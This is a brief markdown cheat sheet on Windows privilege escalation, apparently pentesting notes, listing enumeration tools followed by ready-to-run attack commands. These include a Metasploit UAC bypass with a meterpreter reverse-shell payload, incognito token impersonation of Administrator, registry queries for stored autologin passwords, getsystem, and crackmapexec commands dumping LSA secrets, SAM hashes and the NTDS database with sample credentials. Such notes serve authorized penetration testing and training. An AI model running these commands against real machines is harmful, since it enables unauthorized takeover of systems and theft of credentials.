# Privilege Escalation Windows
#### Automated tools
* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
* [Sherlock](https://github.com/rasta-mouse/Sherlock)
* [Watson](https://github.com/rasta-mouse/Watson)
* [JAWS](https://github.com/411Hall/JAWS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
#### Enumerate with Privescheck
* [Privescheck](https://github.com/itm4n/PrivescCheck)
````bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
````
#### UAC Bypass (Metasploit)
````bash
use exploit/windows/local/bypassuac_injection
set session 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
````
#### Token Impersonation
````bash
# load plugin
load incognito

# List tokens
list_tokens -u

# Impersonate
impersonate_token admin\\Administrator
````
#### Windows autologin
````bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
````
#### Meterpreter (Metasploit)
````bash
getsystem
````
#### Registry
````bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
````
#### Crackmapexec
````bash
# lsa 
crackmapexec smb 10.0.2.11 -u admin -p 12345678 --lsa
# sam 
crackmapexec smb 10.0.2.11 -u admin -p 12345678 --sam
# ntds
crackmapexec smb 10.0.2.11 -u admin -p 12345678 --ntds
````